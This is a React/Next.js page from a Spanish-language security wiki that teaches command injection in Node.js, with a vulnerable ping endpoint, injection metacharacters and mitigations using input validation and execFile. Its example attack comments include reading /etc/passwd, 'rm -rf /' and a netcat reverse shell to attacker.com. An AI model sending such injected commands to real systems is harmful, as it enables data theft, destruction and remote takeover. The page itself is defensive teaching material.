'use client';

import Link from 'next/link';
import { useParams } from 'next/navigation';
import { Home, AlertTriangle, Terminal } from 'lucide-react';

export default function CommandInjectionPage() {
  const params = useParams();
  const locale = params.locale as string;

  return (
    <div className="min-h-screen">
      <div className="bg-white dark:bg-slate-900/50 border-b border-slate-200 dark:border-slate-700 px-8 py-4">
        <div className="max-w-5xl mx-auto flex items-center gap-2 text-sm">
          <Link href={`/${locale}/wiki`} className="text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:text-white transition-colors flex items-center gap-1">
            <Home className="w-4 h-4" />Wiki</Link>
          <span className="text-slate-600">/</span>
          <Link href={`/${locale}/wiki`} className="text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:text-white transition-colors">Vulnerabilidades</Link>
          <span className="text-slate-600">/</span>
          <span className="text-white dark:text-white">Command Injection</span>
        </div>
      </div>

      <div className="bg-gradient-to-r from-red-600 via-orange-600 to-yellow-600 px-8 py-12">
        <div className="max-w-5xl mx-auto">
          <div className="flex items-center gap-3 mb-4">
            <div className="px-3 py-1 bg-yellow-500/20 text-yellow-700 dark:text-yellow-300 rounded-lg text-sm font-medium border border-yellow-500/30">Intermedio</div>
            <div className="px-3 py-1 bg-red-500/30 text-red-200 rounded-lg text-sm font-medium border border-red-400/40">CVSS 9.8 - Crítico</div>
            <div className="px-3 py-1 bg-white/10 backdrop-blur-sm text-slate-900 dark:text-white rounded-lg text-sm">20 min</div>
          </div>
          <h1 className="text-4xl md:text-5xl font-bold text-slate-900 dark:text-white mb-4 flex items-center gap-4">
            <Terminal className="w-12 h-12" />Command Injection</h1>
          <p className="text-xl text-yellow-100">Ejecución de comandos del sistema operativo a través de input del usuario</p>
        </div>
      </div>

      <div className="max-w-5xl mx-auto px-8 py-12">
        <div className="prose prose-invert prose-lg max-w-none">
          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">¿Qué es Command Injection?</h2>
            <p className="text-slate-700 dark:text-slate-300 mb-6">
              Ocurre cuando una aplicación ejecuta comandos del sistema usando input del usuario sin validación, 
              permitiendo al atacante ejecutar comandos arbitrarios en el servidor.
            </p>
            
            <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-6 mb-6">
              <h3 className="text-xl font-semibold text-red-600 dark:text-red-400 mb-3">Ejemplo Vulnerable</h3>
              <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                <pre className="text-red-600 dark:text-red-400">
{`// Node.js - VULNERABLE
const { exec } = require('child_process');

app.get('/ping', (req, res) => {
  const ip = req.query.ip;
  // ❌ PELIGROSO: concatenar input del usuario
  exec(\`ping -c 4 \${ip}\`, (error, stdout) => {
    res.send(stdout);
  });
});

// Ataque:
// GET /ping?ip=8.8.8.8; cat /etc/passwd
// GET /ping?ip=8.8.8.8 && rm -rf /
// GET /ping?ip=8.8.8.8 | nc attacker.com 4444 -e /bin/bash`}
                </pre>
              </div>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">Caracteres de Inyección</h2>
            <div className="bg-slate-100 dark:bg-slate-800/50 rounded-xl p-6 font-mono text-sm">
              <pre className="text-orange-400">
{`; cmd      # Ejecutar cmd después
| cmd      # Pipe output a cmd
|| cmd     # OR lógico (ejecuta si falla el primero)
& cmd      # Ejecutar en background
&& cmd     # AND lógico
\`cmd\`     # Command substitution
$(cmd)    # Command substitution
> file    # Redirigir output
< file    # Redirigir input
%0a cmd   # Newline (URL encoded)`}
              </pre>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">Mitigación</h2>
            <div className="space-y-6">
              <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-4">1. NO usar exec/system</h3>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-green-600 dark:text-green-400">
{`// ✅ Usar librerías específicas en lugar de comandos shell
// Mal: exec('ping ' + ip)
// Bien: usar librería de ping

const ping = require('ping');
const result = await ping.promise.probe(ip, { timeout: 10 });

// Para operaciones de archivos, usar APIs de Node
const fs = require('fs/promises');
await fs.readFile(filename); // NO usar cat filename`}
                  </pre>
                </div>
              </div>

              <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-4">2. Validación Estricta</h3>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-green-600 dark:text-green-400">
{`// Si DEBES usar exec, validar input
const ipRegex = /^(\\d{1,3}\\.){3}\\d{1,3}$/;

if (!ipRegex.test(ip)) {
  return res.status(400).json({ error: 'Invalid IP' });
}

// Whitelist de valores permitidos
const allowedCommands = ['start', 'stop', 'status'];
if (!allowedCommands.includes(command)) {
  return res.status(400).json({ error: 'Invalid command' });
}`}
                  </pre>
                </div>
              </div>

              <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-4">3. Usar execFile con argumentos</h3>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-green-600 dark:text-green-400">
{`const { execFile } = require('child_process');

// ✅ execFile NO invoca shell, pasa argumentos directamente
execFile('ping', ['-c', '4', ip], (error, stdout) => {
  if (error) {
    return res.status(500).json({ error: 'Ping failed' });
  }
  res.send(stdout);
});

// Los caracteres especiales se tratan como literales, no comandos`}
                  </pre>
                </div>
              </div>
            </div>
          </section>

          <div className="bg-gradient-to-r from-red-600/20 to-orange-600/20 border border-red-500/30 rounded-xl p-8 text-center">
            <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente</h3>
            <Link href={`/${locale}/wiki/vulnerabilidades/ssti`}
              className="inline-flex items-center gap-2 px-6 py-3 bg-orange-600 hover:bg-orange-700 text-slate-900 dark:text-white rounded-xl font-semibold transition-all">
              Server-Side Template Injection<span>→</span></Link>
          </div>
        </div>
      </div>
    </div>
  );
}
